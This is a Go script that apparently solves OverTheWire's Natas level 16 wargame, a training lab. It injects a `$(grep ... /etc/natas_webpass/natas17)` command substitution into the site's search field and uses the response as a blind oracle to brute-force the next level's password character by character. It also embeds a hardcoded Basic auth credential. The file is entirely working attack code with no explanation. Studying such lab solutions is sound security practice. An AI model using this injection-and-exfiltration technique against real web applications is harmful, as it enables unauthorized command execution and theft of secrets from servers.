package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"

	"github.com/PuerkitoBio/goquery"
)

const (
	formurl    = "http://natas16.natas.labs.overthewire.org/"
	characters = "eEqQJjhHBboOlLfFnNvVwW9sS87kK0tT5cC"
)

func main() {
	formData := url.Values{}
	password := ""
	reg := regexp.MustCompile("zigzag")
	for len(password) < 32 {
		for _, a := range characters {
			payload := `$(grep ` + password + string(a) + ` /etc/natas_webpass/natas17)zigzag`
			formData.Set("needle", payload)
			formData.Set("submit", "Search")

			req, err := http.NewRequest("POST", formurl, strings.NewReader(formData.Encode()))
			if err != nil {
				log.Fatalf("Failed to create req")
			}

			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			req.Header.Set("Authorization", "Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw==")

			client := &http.Client{}

			resp, err := client.Do(req)
			if err != nil {
				log.Fatalf("Failed to send req")
			}
			defer resp.Body.Close()

			responseBody, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				log.Fatalf("Failed to read resp")
			}
			doc, err := goquery.NewDocumentFromReader(strings.NewReader(string(responseBody)))
			if err != nil {
				log.Fatalf("Failed to parse html")
			}
			doc.Find("pre").Each(func(i int, s *goquery.Selection) {
				if !reg.MatchString(s.Text()) {
					password += string(a)
				fmt.Printf("%s\n",password)
				}
			})
		}
	}
}

